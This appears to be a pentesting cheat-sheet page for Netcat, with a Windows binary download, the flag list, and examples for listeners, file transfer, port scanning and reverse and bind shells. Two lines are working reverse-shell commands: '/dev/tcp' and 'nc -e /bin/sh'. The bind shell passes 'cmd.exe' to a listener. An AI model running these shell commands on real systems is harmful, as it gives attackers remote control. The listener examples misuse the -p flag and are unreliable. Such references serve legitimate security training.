icon:fontawesome/solid/terminal

# Nc

Versatile networking tool used for reading from and writing to network connections using TCP or UDP.

## Binary for Windows

- [nc.exe](../assets/files/nc.exe){:download="nc.exe"}
- SHA256 ’nc.exe’ - be4211fe5c1a19ff393a2bcfa21dad8d0a687663263a63789552bda446d9421b

## Usage

```bash
nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
```

## Flags

```bash
      [-m minttl] [-O length] [-P proxy_username] [-p source_port]
      [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
      [-X proxy_protocol] [-x proxy_address[:port]]       [destination] [port]
    Command Summary:
        -4      Use IPv4
        -6      Use IPv6
        -b      Allow broadcast
        -C      Send CRLF as line-ending
        -D      Enable the debug socket option
        -d      Detach from stdin
        -F      Pass socket fd
        -h      This help text
        -I length   TCP receive buffer length
        -i interval Delay interval for lines sent, ports scanned
        -k      Keep inbound sockets open for multiple connects
        -l      Listen mode, for inbound connects
        -M ttl      Outgoing TTL / Hop Limit
        -m minttl   Minimum incoming TTL / Hop Limit
        -N      Shutdown the network socket after EOF on stdin
        -n      Suppress name/port resolutions
        -O length   TCP send buffer length
        -P proxyuser    Username for proxy authentication
        -p port     Specify local port for remote connects
        -q secs     quit after EOF on stdin and delay of secs
        -r      Randomize remote ports
        -S      Enable the TCP MD5 signature option
        -s source   Local source address
        -T keyword  TOS value
        -t      Answer TELNET negotiation
        -U      Use UNIX domain socket
        -u      UDP mode
        -V rtable   Specify alternate routing table
        -v      Verbose
        -W recvlimit    Terminate after receiving a number of packets
        -w timeout  Timeout for connects and final net reads
        -X proto    Proxy protocol: "4", "5" (SOCKS) or "connect"
        -x addr[:port]  Specify proxy address and port
        -Z      DCCP mode
        -z      Zero-I/O mode [used for scanning]
    Port numbers can be individual or ranges: lo-hi [inclusive]
```

## Examples

##### Create a Netcat listener

This listener will listen on specific IP and port. IP can be removed if any interface is needed.

```bash
nc -lvp 10.10.10.2 80
```

##### Transferring files

Receiver

```bash
nc -nlvp 10.10.10.2 4444 > incoming.exe
```

Sender

```bash
nc -nv 10.10.10.2 4444 < /Downloads/wget.exe
```

##### Reverse Shell

Receiver

```bash
nc -nlvp 10.10.10.2 4444
```

Identity connecting and sending the reverse shell:

```bash
bash -i >& /dev/tcp/10.10.10.2/4444 0>&1
```

OR identity connecting and sending the reverse shell:

```bash
nc 10.10.10.2 4444 -e /bin/sh
```

##### Bind Shell

Receiver

```bash
nc -nlvp 4444 -e cmd.exe
```

Identity connecting to bind shell:

```bash
nc -nv <ip> 4444
```

##### Port Scanning (TCP)

**Note: NetCat port scanning is based on the three-way handshake.**

```bash
nc -nvv -w 1 -z 10.10.10.20 3380-3390
```

##### Port Scanning (UDP)

```bash
nc -nv -u -z -w 1 10.10.10.20 160-162
```

## References

- [Linux.die.net](https://linux.die.net/man/1/nc)
